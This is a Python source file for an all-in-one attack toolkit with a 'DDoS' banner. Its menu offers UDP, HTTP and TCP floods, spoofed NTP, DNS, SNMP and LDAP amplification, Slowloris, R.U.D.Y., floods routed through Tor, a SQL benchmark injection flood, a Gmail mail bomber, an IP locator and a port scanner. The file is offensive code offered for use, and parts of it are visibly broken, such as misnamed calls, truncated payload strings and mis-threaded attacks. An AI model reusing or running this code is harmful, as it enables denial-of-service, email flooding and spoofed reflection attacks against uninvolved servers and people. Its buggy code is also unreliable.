import sys, time, socket, random, threading, os, subprocess, smtplib, requests, httplib, socks
from pinject import *
from colorama import init, Fore, Back, Style

init()

def cprint(msg, foreground = "black", background = "white"):
    fground = foreground.upper()
    bground = background.upper()
    style = getattr(Fore, fground) + getattr(Back, bground)
    print(style + msg + Style.RESET_ALL)
def logo():
    cprint('  /$$$$$$$  /$$$$$$              /$$$$$$$ \n'
           ' | $$__  $$| $$__  $$           /$$__  $$ \n'
           ' | $$  \ $$| $$  \ $$  /$$$$$$ | $$  \__/ \n'
           ' | $$  | $$| $$  | $$ /$$__  $$|  $$$$$$  \n'
           ' | $$  | $$| $$  | $$| $$  \ $$ \____  $$ \n'
           ' | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$ \n'
           ' | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/ \n'
           ' |_______/ |_______/  \______/  \______/  \n', 'green', 'black')

def menu():
    logo()
    cprint('1) DDOS',  'white', 'black')
    cprint('2) Tools', 'white', 'black')
    cprint('3) MailBomber', 'white', 'black')
    cprint('4) IP Locator', 'white', 'black')
    cprint('5) Port scanner', 'white', 'black')
    

def mailbomb():
    mail = raw_input('Email: ')
    passwd = raw_input('Password: ')
    to = raw_input('To: ')
    body = raw_input('Message: ')
    num = raw_input('Number of send: ')
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(mail,passwd)
    i = 1
    while 1 <= num:
        i = i + 1
        server.sendmai(mail,to,body)
    server.quit()
    
def iplocator():
    ip = raw_input('IP: ')
    url = 'http://ip-api.com/json/'+ip
    r = requests.get(url)
    sl = r.text
    dct = eval(sl)
    for i in dct:
        print(i, '-', dct[i])

def scanner():
    target   =   socket.gethostbyname(raw_input('Target: '))
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(port)
        sock.close()
        
def thread(numthreads, attack):
    threads = []
    for n in range(numthreads):
        thread =  threading.Thread(target=attack)
        thread.daemon = True
        threads.append(thread)
        thread.start()
        
        thread1 =  threading.Thread(target=attack)
        thread1.daemon = True
        thread1.start()
        
        threads.append(thread1)

menu()
var = raw_input('Number: ')
os.system("cls")

def attacktype():
    if(var == '1'):
        logo()
        cprint('1)  UDP',  'white', 'black')
        cprint('2)  HTTP', 'white', 'black')
        cprint('3)  TCP',  'white', 'black')
        cprint('4)  NTP',  'white', 'black')
        cprint('5)  DNS',  'white', 'black')
        cprint('6)  SNMP', 'white', 'black')
        cprint('7)  LDAP', 'white', 'black')
        cprint('8)  Slowloris', 'white', 'black')
        cprint('9)  HTTP-TOR',   'white', 'black')
        cprint('10) TCP-TOR', 'white', 'black')
        cprint('11) R.U.D.Y.', 'white', 'black')
    elif(var == '2'):
        logo()
        cprint('a) xerxes',   'blue', 'black')
        cprint('b) dominate', 'blue', 'black')
        cprint('c) chargen',  'blue', 'black')
        cprint('d) Refref',   'blue', 'black')
    elif(var == '3'):
        os.system("cls")
        logo()
        mailbomb()
    elif(var == '4'):
        os.system("cls")
        logo()
        iplocator()
    elif(var == '5'):
        os.system("cls")
        logo()
        scanner()

attacktype()

def udp(target, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        sock.sendto(bytes, (target, port))
        sent = sent + 1
        cprint(str(sent), 'red', 'black')

def http(target, duration):
    sent = 0
    uagent=[]
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    timeout = time.time() + duration
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n\n").encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.sendto( packet, (target, 80) )
        sent = sent + 1
        print(sent)

def HttpTor(target, duration):
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9150, True)
    socket.socket = socks.socksocket
    timeout = time.time() + duration
    sent = 0
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        sent = sent + 1
        connect = httplib.HTTPConnection(target)
        connect.request('GET / HTTP/1.1\nHost: '+ target + '\n\n', target)
        cprint(str(sent), 'green', 'black')
        
def TCPTor(target, duration):
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9150, True)
    socket.socket = socks.socksocket
    MESSAGE = 'fuck'
    sent = 0
    timeout = time.time() + duration
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.send(MESSAGE)
        sent = sent + 1
        s.close()
        cprint(str(sent), 'green', 'black')

def tcp(target, duration):
    TCP_PORT = 80
    BUFFER_SIZE = 1024
    MESSAGE = "Fuck"
    num = 0
    timeout = time.time() + duration
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, TCP_PORT))
        s.send(MESSAGE)
        num = num + 1
        cprint(str(num), 'green', 'black')
        s.close()

def refref(ip, duration):
    url = ip+' and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))'
    timeout = time.time() + duration
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        r = requests.get(url)

def RUDY(target, path):
    print('Ctrl + c')
    headers = '/n'.join(['POST '+ path +' HTTP/1.1',
                         'Host: ' + target,
                         'Connection: keep-alive',
                         'Content-Length: 100000000',
                         'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'])
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    print(headers)
    sock.send(headers)
    sent = 0
    while True:
        sent = sent + 1
        sock.send("A")
        time.sleep(3)
        cprint(str(sent), 'green', 'black')
                                                                                               
def func(source_ip, dest_ip, duration, payload, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_header = UDP(random.randint(1, 65535), port, payload).pack(source_ip, dest_ip)
    ip_header = IP(source_ip, dest_ip, udp_header, socket.IPPROTO_UDP).pack()
    timeout = time.time() + duration
    sent = 0
    while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
        sock.sendto(ip_header+udp_header+payload, (dest_ip, port))

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en"
    ]

sockets = []
def setupSocket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock
def slowloris():
    count = 200
    ip = raw_input('Taarget: ')
    numthreads = raw_input('Thread: ')
    for _ in range(count):
        try:
            print("Socket {}".format(_))
            sock = setupSocket(ip)
        except socket.error:
            break

        sockets.append(sock)

    while True:
        print("Connected to {} sockets. Sending headers...".format(len(sockets)))

        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        for _ in range(count - len(sockets)):
            print("Re-opening closed sockets...")
            try:
                sock = setupSocket(ip)
                if sock:
                    sockets.append(sock)
            except socket.error:
                break

        time.sleep(15)

def req():
    global source_ip
    global dest_ip
    global duration
    global numthreads
    source_ip  = socket.gethostbyname(raw_input('Target: '))
    dest_ip  = socket.gethostbyname(raw_input('Server: '))
    duration = int(raw_input('Time: '))
    numthreads = int(raw_input('Threads: '))
    
def know():
    attack = raw_input('Number: ')
    if(attack == '1'):
        cprint('UDP', 'blue', 'black')
        target   =   socket.gethostbyname(raw_input('Target: '))
        port     =   int(raw_input('Port: '))
        time =   int(raw_input('Time: '))
        numthread = int(raw_input('Threads: '))
        thread(numthread, udp(target,port,time))
    elif(attack == '2'):
        cprint('HTTP', 'blue', 'black')
        target   =   socket.gethostbyname(raw_input('Target: '))
        time =   int(raw_input('Time: '))
        numthread = int(raw_input('Threads: '))
    #   http(target, time)
        thread(numthread, http(target, time))
    elif(attack == '3'):
        cprint('TCP', 'blue', 'black')
        target   =   socket.gethostbyname(raw_input('Target: '))
        time =   int(raw_input('Time: '))
        numthread = int(raw_input('Threads: '))
    #   tcp(target, time)
        thread(numthread, tcp(target, time))
    elif(attack == '4'):
        cprint('NTP', 'blue', 'black')
        req()
        payload = '\x17\x00\x02\x2a'+'\x00'*4
        func(source_ip, dest_ip, duration, payload, 123)
        thread(numthreads, func(source_ip, dest_ip, duration, payload, 123))
    elif(attack == '5'):
        cprint('DNS', 'blue', 'black')
        req()
        payload = '{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
        '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
        '\x00\x00\x00\x00\x00\x00'
        func(source_ip, dest_ip, duration, payload, 53)
        thread(numthreads, func(source_ip, dest_ip, duration, payload, 53))
    elif(attack == '6'):
        cprint('SNMP', 'blue', 'black')
        req()
        payload = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
        "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
        "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
        "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
        "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
        "\x65\x74\x6c\x6f\x67\x6f\x6e"
        func(source_ip, dest_ip, duration, payload, 161)
        thread(numthreads, func(source_ip, dest_ip, duration, payload, 161))
    elif(attack == '7'): 
        cprint('LDAP', 'blue', 'black')
        req()
        payload = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
        "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
        "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
        "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
        "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
        "\x65\x74\x6c\x6f\x67\x6f\x6e"
        func(source_ip, dest_ip, duration, payload, 389)
        thread(numthreads, func(source_ip, dest_ip, duration, payload, 389))
    elif(attack == '8'):
        cprint('Slowloris', 'blue', 'black')
        slowloris()
        thread(numthreads, slowloris)
    elif(attack == '9'):
        target = raw_input('Target: ')
        duration = int(raw_input('Time: '))
        numthread = int(raw_input('Threads: '))
    #   HttpTor(target, duration)
        thread(numthread, HttpTor(target, duration))
    elif(attack == '10'):
        target = raw_input('Target: ')
        duration = int(raw_input('Time: '))
        numthread = int(raw_input('Threads: '))
    #   TCPTor(target, duration)
        thread(numthread, TCPTor(target, duration))
    elif(attack == '11'):
        cprint('R.U.D.Y.', 'blue', 'black')
        target = raw_input('Target: ')
        path = raw_input('Path: ')
        numthread = int(raw_input('Threads: '))
        thread(numthread, RUDY(target, path))
    elif(attack == 'a'):
        Domain = raw_input("Domain: ")
        Port = raw_input("Port: ")
        subprocess.call(["./Dos/xerxes", Domain, Port])
    elif(attack == 'b'):
        target = raw_input("Target: ")
        port = raw_input("Port: ")
        threads = raw_input("Threads: ")
        limit = raw_input("PPS-LIMIT(-1 for no limit): ")
        time = raw_input("Time: ")
        subprocess.call(["./Dos/dominate", target, port, threads, limit, time])
    elif(attack == 'c'):
        target = raw_input("Target: ")
        port = raw_input("Port: ")
        ampfile = raw_input("Amp file: ")
        time = raw_input("Time: ")
        subprocess.call(["./Dos/chargen", target, port, ampfile, time])
    elif(attack == 'd'):
        ip = raw_input("Target: ")
        duration = raw_input("Time: ")

know()
